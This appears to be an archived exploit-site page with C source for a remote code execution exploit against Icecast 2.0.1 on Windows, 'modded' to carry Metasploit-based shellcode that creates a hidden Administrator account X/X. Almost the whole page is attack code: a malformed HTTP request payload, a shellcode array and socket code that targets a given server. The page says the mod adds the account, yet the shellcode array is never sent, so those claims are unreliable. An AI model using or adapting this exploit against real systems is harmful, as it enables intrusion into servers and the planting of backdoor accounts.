<html>
<head>
<title>Icecast <= 2.0.1 Win32 Remote Code Execution Exploit (modded)</title>
<pre>
/*
ICECAST 2.0.1 WiN32 REMOTE EXPLOiT

by Luigi Auriemma

Modded by:

**************************
******* LORDKAOZ *********
*** OF IMPERATORI TEAM ***
**************************
Greetz to marc0z, m3nTe, DarKBad, OuT, FaX (Anche se non se lo merita), MeSSiA e eXpLoIt!

This exploit will add an Administrator account with USER: X AND PASSWORD: X

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;
    #include &quot;winerr.h&quot;

    #define close   closesocket
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netdb.h&gt;
    #include &lt;netinet/in.h&gt;
#endif



#define VER     &quot;0.1&quot;
#define PORT    8000
#define BUFFSZ  2048
#define TIMEOUT 3
#define EXEC    &quot;GET / HTTP/1.0\r\n&quot; \
                &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; \
                &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; \
                &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; \
                &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; &quot;a\r\n&quot; \
                &quot;\xcc&quot; 

char shellcode[] =
&quot;\x66\x81\xec\x80\x00\x89\xe6\xe8\xb7\x00\x00\x00\x89\x06\x89\xc3&quot;
&quot;\x53\x68\x7e\xd8\xe2\x73\xe8\xbd\x00\x00\x00\x89\x46\x0c\x53\x68&quot;
&quot;\x8e\x4e\x0e\xec\xe8\xaf\x00\x00\x00\x89\x46\x08\x31\xdb\x53\x68&quot;
&quot;\x70\x69\x33\x32\x68\x6e\x65\x74\x61\x54\xff\xd0\x89\x46\x04\x89&quot;
&quot;\xc3\x53\x68\x5e\xdf\x7c\xcd\xe8\x8c\x00\x00\x00\x89\x46\x10\x53&quot;
&quot;\x68\xd7\x3d\x0c\xc3\xe8\x7e\x00\x00\x00\x89\x46\x14\x31\xc0\x31&quot;
&quot;\xdb\x43\x50\x68\x72\x00\x73\x00\x68\x74\x00\x6f\x00\x68\x72\x00&quot;
&quot;\x61\x00\x68\x73\x00\x74\x00\x68\x6e\x00\x69\x00\x68\x6d\x00\x69&quot;
&quot;\x00\x68\x41\x00\x64\x00\x89\x66\x1c\x50\x68\x58\x00\x00\x00\x89&quot;
&quot;\xe1\x89\x4e\x18\x68\x00\x00\x5c\x00\x50\x53\x50\x50\x53\x50\x51&quot;
&quot;\x51\x89\xe1\x50\x54\x51\x53\x50\xff\x56\x10\x8b\x4e\x18\x49\x49&quot;
&quot;\x51\x89\xe1\x6a\x01\x51\x6a\x03\xff\x76\x1c\x6a\x00\xff\x56\x14&quot;
&quot;\xff\x56\x0c\x56\x6a\x30\x59\x64\x8b\x01\x8b\x40\x0c\x8b\x70\x1c&quot;
&quot;\xad\x8b\x40\x08\x5e\xc2\x04\x00\x53\x55\x56\x57\x8b\x6c\x24\x18&quot;
&quot;\x8b\x45\x3c\x8b\x54\x05\x78\x01\xea\x8b\x4a\x18\x8b\x5a\x20\x01&quot;
&quot;\xeb\xe3\x32\x49\x8b\x34\x8b\x01\xee\x31\xff\xfc\x31\xc0\xac\x38&quot;
&quot;\xe0\x74\x07\xc1\xcf\x0d\x01\xc7\xeb\xf2\x3b\x7c\x24\x14\x75\xe1&quot;
&quot;\x8b\x5a\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5a\x1c\x01\xeb\x8b\x04&quot;
&quot;\x8b\x01\xe8\xeb\x02\x31\xc0\x89\xea\x5f\x5e\x5d\x5b\xc2\x08\x00&quot;;



int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int     sd;
    u_short port = PORT;
    u_char  buff[BUFFSZ];


    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Icecast &lt;= 2.0.1 Win32 remote code execution &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@altervista.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
		&quot;*************************************\n&quot;
		&quot;SHELLCODE ADDED BY LORDKAOZ\n&quot;
		&quot;OF #IMPERATORI\n&quot;
		&quot;*************************************\n&quot;
		&quot;SHELLCODE BASED ON WIN32_ADDUSER\n&quot;
		&quot;BY METASPLOIT GROUP\n&quot;
		&quot;*************************************\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 2) {
        printf(&quot;\nUsage: %s &lt;server&gt; [port(%d)]\n&quot;
            &quot;\n&quot;
            &quot;THiS iS A POC EXPLOIT BY Luigi Auriemma\n&quot;
			&quot;AND MODDED BY LORDKAOZ WITH AN ADMINISTRATOR X/X ADDUSER\n&quot;
			&quot;BASED ON METASPLOIT SHELLCODE\n&quot;
            &quot;\n&quot;, argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

    if(argc &gt; 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr = resolv(argv[1]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf(&quot;\n- target   %s:%hu\n&quot;,
        inet_ntoa(peer.sin_addr), port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd &lt; 0) std_err();

    if(connect(sd, (struct sockaddr *)&amp;peer, sizeof(peer))
      &lt; 0) std_err();

    fputs(&quot;- send malformed data\n&quot;, stdout);
    if(send(sd, EXEC, sizeof(EXEC) - 1, 0)
      &lt; 0) std_err();

    if((timeout(sd) &lt; 0) || (recv(sd, buff, BUFFSZ, 0) &lt; 0)) {
        fputs(&quot;\nThe Server Is Vulnerable!!!\n\n&quot;, stdout);
    } else {
        fputs(&quot;\nServer Doesn't Seem To Be Vulnerable\n\n&quot;, stdout);
    }

    close(sd);
    return(0);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
    if(err &lt; 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Cannot Resolve Hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u_long *)(hp-&gt;h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif

// milw0rm.com [2004-10-12]
</pre>
</html>

